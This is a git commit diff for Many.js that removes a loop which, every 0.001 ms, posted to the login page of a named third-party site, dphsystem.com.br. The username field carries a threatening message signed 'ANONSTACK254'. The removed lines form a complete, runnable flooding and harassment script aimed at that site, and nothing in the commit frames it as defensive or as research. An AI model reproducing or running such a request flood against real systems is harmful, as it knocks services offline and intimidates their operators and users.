29c744e1e7ce19a0857d7e382a81ff82bd4d29f0
michaelres13 <100482848+michaelres13@users.noreply.github.com>
2022-03-15 15:36:27 -0300

    Update Many.js

--- Many.js
+++ Many.js
@@ -13,16 +13,5 @@ app.listen(process.env.PORT, ()=>{
 
 
 setInterval(()=>{
-    axios({
-        url:"https://dphsystem.com.br/login",
-        method:"POST",
-        Headers:{
-            "content-type":" application/x-www-form-urlencoded; charset=UTF-8"
-        },
-        data:"user=Peçam_desculpas_no_centro_ou_esse_sera_o_fim_do_System_BY_ANONSTACK254&pass=anon&code=4522"
-    }).then((response)=>{
-        console.log("FOI")
-    }).catch((e)=>{
-        console.log("E")
-    })
-},0.001)
+
+},10000)
